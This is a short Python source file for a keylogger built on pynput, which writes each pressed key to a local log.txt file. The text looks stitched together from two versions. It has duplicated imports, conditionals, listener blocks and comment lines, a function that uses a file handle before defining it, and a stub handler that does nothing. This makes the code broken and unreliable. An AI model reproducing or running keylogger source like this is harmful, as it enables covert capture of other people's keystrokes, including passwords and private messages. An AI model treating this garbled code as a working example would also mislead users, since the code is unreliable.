from pynput.keyboard import Key, Listener # type: ignore
from pynput.keyboard import Listener # type: ignore


def call_press(key):
    f = open("log.txt", "a")
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.space":
        letter = " "
    if letter == "Key.shift_r":
        letter = ""
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    letter = letter.replace("'", "")
    if letter == "Key.enter":
        f.write("\n")
    else:
        f.write(letter)
        letter = "\n"

    f.close()
    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped

with Listener(on_press=call_press) as listener:
    listener.join()
with Listener(on_press=write_to_file) as l:
    l.join()

# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released. It's just a good coding principle o follow
# or the program stops the memory is released. It's just a good coding principle to follow